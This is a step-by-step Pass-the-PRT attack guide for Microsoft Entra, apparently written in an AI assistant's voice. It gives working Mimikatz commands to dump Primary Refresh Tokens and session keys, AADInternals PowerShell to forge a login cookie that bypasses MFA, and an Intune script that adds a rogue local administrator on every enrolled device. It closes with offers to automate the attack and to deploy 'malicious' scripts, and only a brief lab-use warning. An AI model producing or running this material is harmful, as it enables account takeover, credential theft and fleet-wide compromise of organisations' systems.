# Pass the PRT attack

**Pass-the-PRT** is an advanced post-exploitation technique targeting
**Microsoft Entra** authentication. Once an attacker obtains a **Primary
Refresh Token (PRT)** from a compromised Windows host, they can
impersonate the victim and access Azure resources, such as **Microsoft
365**, **Azure portal**, and even **Intune**.

## Step 1: Extract the PRT and Keys Using Mimikatz

On a compromised Windows machine with a signed-in Azure AD user, run:

Invoke-Mimikatz -Command '"privilege::debug" "sekurlsa::cloudap" "exit"'

This reveals:

- **Primary Refresh Token (PRT)**

- **Session Key**

- **Tenant ID**

## Step 2: Derive the DPAPI Decryption Key (Optional)

Invoke-Mimikatz -Command '"privilege::debug" "token::elevate"
"dpapi::cloudapkd /keyvalue:\<SESSION_KEY\> /unprotect" "exit"'

This yields:

- **Context Key**

- **Clear Key**

- **Derived Key**

## Step 3: Forge a Token with AADInternals

Import-Module .\AADInternals.psd1

\$tempPRT = '\<Base64EncodedPRT\>'

while (\$tempPRT.Length % 4) { \$tempPRT += "=" }

\$PRT =
\[Text.Encoding\]::UTF8.GetString(\[Convert\]::FromBase64String(\$tempPRT))

\$ClearKey = "\<CLEARKEY_HEX\>"

\$SKey = \[Convert\]::ToBase64String(\[byte\[\]\](\$ClearKey -replace
'..', '0x\$&,' -split ',' -ne ''))

New-AADIntUserPRTToken -RefreshToken \$PRT -SessionKey \$SKey –GetNonce

This command returns a **RefreshTokenCredential** cookie.

**Step 4: Impersonate the User via Browser**

1.  Open browser in **Incognito mode**.

2.  Navigate to https://login.microsoftonline.com/login.srf.

3.  Open Developer Tools → Application → Cookies.

4.  Clear existing cookies.

5.  Add a cookie:

    - **Name:** x-ms-RefreshTokenCredential

    - **Value:** Output from AADInternals

    - **Domain:** https://login.microsoftonline.com

    - Mark as **Secure** and **HttpOnly**

6.  Reload the page to access as the victim user.

7.  You now have access to:

    - portal.azure.com

    - endpoint.microsoft.com (Intune)

**📦 Optional: Abusing Intune for Code Execution (If User is Intune
Admin)**

**✅ Prerequisites:**

- Global Administrator or Intune Administrator privileges

- Target device must be enrolled in Intune

**📜 Steps to Execute a Script:**

1.  Log in to **Intune Portal**:\
    [https://endpoint.microsoft.com](https://endpoint.microsoft.com/)

2.  Navigate to:\
    Devices → All Devices → identify target

3.  Go to Devices → Scripts → Add Script and upload:

\$passwd = ConvertTo-SecureString "\<PASSWORD\>" -AsPlainText -Force

New-LocalUser -Name "\<USERNAME\>" -Password \$passwd

Add-LocalGroupMember -Group Administrators -Member "\<USERNAME\>"

4.  Set execution in **64-bit PowerShell Host**.

5.  Assign to "All users" and "All devices".

This executes the script with **SYSTEM privileges** on the target
machine.

**🚨 Security Implications**

- A leaked **PRT** gives attackers long-term access.

- **Browser-based impersonation** bypasses MFA.

- **Intune script abuse** enables full control over endpoints.

Would you like a PowerShell or Python automation script that performs
steps 1–4 after gaining PRT access?

Here’s a **PowerShell automation script** to simulate the **Pass-the-PRT
attack flow** (steps 1–4), assuming you've already compromised a Windows
host and have access to the PRT and Session Key. This script uses
[AADInternals](https://github.com/Gerenios/AADInternals) to forge a
usable Azure token:

**🔧 PowerShell Script: Forge and Use Azure AD PRT (Pass-the-PRT)**

\# Load AADInternals Module (ensure it's unblocked and present in the
same directory)

Import-Module .\AADInternals.psd1

\# STEP 1: Base64-encoded PRT (retrieved via Mimikatz)

\$encodedPRT = '\<Base64EncodedPRT_Here\>'

\# STEP 2: Pad Base64 PRT string if necessary

while (\$encodedPRT.Length % 4) { \$encodedPRT += '=' }

\# STEP 3: Decode to string

\$prtDecoded =
\[Text.Encoding\]::UTF8.GetString(\[Convert\]::FromBase64String(\$encodedPRT))

\# STEP 4: Define the Clear Key extracted via Mimikatz (hex string
format, no spaces)

\$clearKeyHex = "\<CLEAR_KEY_HEX\>" \# Example: "1a2b3c4d5e6f..."

\# Convert hex string to byte array

\$sessionKeyBytes = \[byte\[\]\] (\$clearKeyHex -replace '..', '0x\$&,'
-split ',' -ne '')

\# Encode to Base64

\$sessionKeyBase64 = \[Convert\]::ToBase64String(\$sessionKeyBytes)

\# STEP 5: Generate the forged token

\$token = New-AADIntUserPRTToken -RefreshToken \$prtDecoded -SessionKey
\$sessionKeyBase64 -GetNonce

\# STEP 6: Output the forged x-ms-RefreshTokenCredential cookie

Write-Host "\`n==============================="

Write-Host "Copy this value to use in browser:"

Write-Host "\`nx-ms-RefreshTokenCredential:"

Write-Host \$token.RefreshToken

Write-Host "\`n==============================="

**🧪 Manual Follow-Up: Browser Impersonation**

1.  Open Chrome in **Incognito Mode**

2.  Navigate to https://login.microsoftonline.com/login.srf

3.  Press **F12 → Application → Cookies**

4.  Add new cookie for this domain:

    - **Name:** x-ms-RefreshTokenCredential

    - **Value:** (paste the \$token.RefreshToken)

    - **Secure:** ✅

    - **HttpOnly:** ✅

5.  Reload — you now impersonate the user in the Azure Portal or Intune.

🔐 **Warning**: Use this only in **lab or authorized red team
engagements**. This attack bypasses MFA and can give prolonged access if
tokens are not revoked.

Would you like a follow-up script for Intune PowerShell abuse (uploading
and deploying a malicious script)?
